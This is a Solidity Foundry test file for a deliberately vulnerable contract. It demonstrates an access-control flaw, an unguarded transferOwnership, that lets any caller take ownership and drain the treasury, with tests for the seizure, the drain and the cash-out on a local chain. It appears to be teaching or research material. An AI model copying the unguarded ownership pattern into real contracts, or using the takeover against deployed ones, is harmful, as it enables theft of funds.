// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {UnprotectedConfig} from "../src/vulnerable/UnprotectedConfig.sol";
import {AccessControlAttacker} from "../src/attackers/AccessControlAttacker.sol";

/// @title UnprotectedConfigTest
/// @notice Proves the broken access control (SWC-105) in UnprotectedConfig:
///         the contract is correctly guarded EVERYWHERE except transferOwnership,
///         and that single gap lets any caller take ownership and then drain the
///         treasury through the (properly guarded) sweep().
/// @dev Local chain, fake funds only.
contract UnprotectedConfigTest is Test {
    UnprotectedConfig internal config;
    AccessControlAttacker internal attacker;

    /// @dev The legitimate administrator (deploys the contract, owns it).
    address internal admin = makeAddr("admin");
    /// @dev Where fees are routed. Just a bystander here.
    address internal feeRecipient = makeAddr("feeRecipient");
    /// @dev The human behind the exploit contract.
    address internal attackerEoa = makeAddr("attackerEoa");

    uint256 internal constant TREASURY = 3 ether;
    uint256 internal constant FEE_BPS = 100; // 1%

    function setUp() public {
        // prank covers exactly ONE call - the constructor - so owner == admin,
        // not this test contract.
        vm.prank(admin);
        config = new UnprotectedConfig(feeRecipient, FEE_BPS);

        // Fund the treasury. deposit() is intentionally open to anyone, so this
        // models accrued protocol fees sitting in the contract.
        vm.deal(admin, TREASURY);
        vm.prank(admin);
        config.deposit{value: TREASURY}();

        // The exploit contract, owned by the attacker's EOA.
        vm.prank(attackerEoa);
        attacker = new AccessControlAttacker(config);
    }

    /// @notice Baseline. If this fails, every result below is meaningless.
    function test_setupIsSane() public view {
        assertEq(config.owner(), admin, "admin owns the config");
        assertEq(config.feeRecipient(), feeRecipient, "fee recipient set");
        assertEq(config.feeBps(), FEE_BPS, "fee bps set");
        assertEq(config.totalAssets(), TREASURY, "treasury holds 3 ETH");
        assertEq(attacker.owner(), attackerEoa, "EOA owns the exploit");
        assertEq(address(attacker.config()), address(config), "exploit points at the config");
    }

    /// @notice The finding, localized: every privileged function IS guarded and
    ///         reverts for a stranger - except transferOwnership, which does not.
    ///         This is what makes it a one-line bug, not a wide-open contract.
    function test_onlyTransferOwnershipIsUnguarded() public {
        // All of these correctly reject the non-owner.
        vm.startPrank(attackerEoa);
        vm.expectRevert("UnprotectedConfig: not owner");
        config.sweep(attackerEoa);
        vm.expectRevert("UnprotectedConfig: not owner");
        config.setFeeRecipient(attackerEoa);
        vm.expectRevert("UnprotectedConfig: not owner");
        config.setFeeBps(0);
        vm.expectRevert("UnprotectedConfig: not owner");
        config.pause();

        // ...but this one does NOT revert: the stranger becomes owner.
        config.transferOwnership(attackerEoa);
        vm.stopPrank();

        assertEq(config.owner(), attackerEoa, "the one unguarded call handed over ownership");
    }

    /// @notice The raw bug needs no exploit contract at all: a plain EOA call to
    ///         transferOwnership is the entire vulnerability.
    function test_eoaSeizesOwnershipDirectly() public {
        vm.prank(attackerEoa);
        config.transferOwnership(attackerEoa);

        assertEq(config.owner(), attackerEoa, "EOA seized ownership in one call");

        // And now the formerly-locked doors open for them.
        vm.prank(attackerEoa);
        config.setFeeRecipient(attackerEoa);
        assertEq(config.feeRecipient(), attackerEoa, "new owner redirected the fees");
    }

    /// @notice THE EXPLOIT: seize ownership, then drain the treasury via the
    ///         guarded sweep(), all in one transaction.
    function test_attackerHijacksAndDrains() public {
        vm.prank(attackerEoa);
        attacker.attack();

        assertEq(config.owner(), address(attacker), "exploit contract is now the owner");
        assertEq(config.totalAssets(), 0, "treasury fully drained");
        assertEq(attacker.loot(), TREASURY, "exploit holds the stolen 3 ETH");
        // The honest admin has been locked out of their own contract.
        assertTrue(config.owner() != admin, "admin is no longer owner");
    }

    /// @notice Cash-out: loot leaves the exploit contract for the attacker's EOA.
    function test_collectSendsLootToOwner() public {
        vm.prank(attackerEoa);
        attacker.attack();

        vm.prank(attackerEoa);
        attacker.collect();

        assertEq(attackerEoa.balance, TREASURY, "EOA cashed out 3 ETH");
        assertEq(attacker.loot(), 0, "exploit contract emptied");
    }

    /// @notice Even the exploit has access control. Custom error -> selector overload.
    function test_collectRevertsForNonOwner() public {
        vm.prank(attackerEoa);
        attacker.attack();

        vm.prank(admin);
        vm.expectRevert(AccessControlAttacker.NotOwner.selector);
        attacker.collect();
    }
}
